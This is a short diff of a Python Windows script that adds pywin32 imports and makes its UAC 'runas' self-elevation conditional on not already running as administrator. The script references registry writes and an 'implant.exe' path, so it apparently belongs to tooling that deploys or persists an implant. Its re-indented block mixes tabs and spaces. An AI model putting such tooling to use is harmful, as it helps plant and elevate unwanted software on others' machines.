@@ -3,6 +3,9 @@ import sys
 import ctypes
 import os.path
 import _winreg
+import pythoncom
+import pywintypes
+import win32api
 import win32com.shell.shell as shell
 
 # Main function.
@@ -60,14 +63,15 @@ def execute()
 	CloseKey(aKey)
 
 
-# Elevate privilege
-ASADMIN = "asadmin"
+if not shell.IsUserAnAdmin():
+	# Elevate privilege
+	ASADMIN = "asadmin"
 
-if sys.argv[-1] != ASADMIN:
-    script = os.path.abspath(sys.argv[0])
-    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
-    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
-    sys.exit(0)
+	if sys.argv[-1] != ASADMIN:
+    	script = os.path.abspath(sys.argv[0])
+    	params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+    	shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+    	sys.exit(0)
 
 PATH = "C:\\SomeDir\\example\\implant.exe" 
 
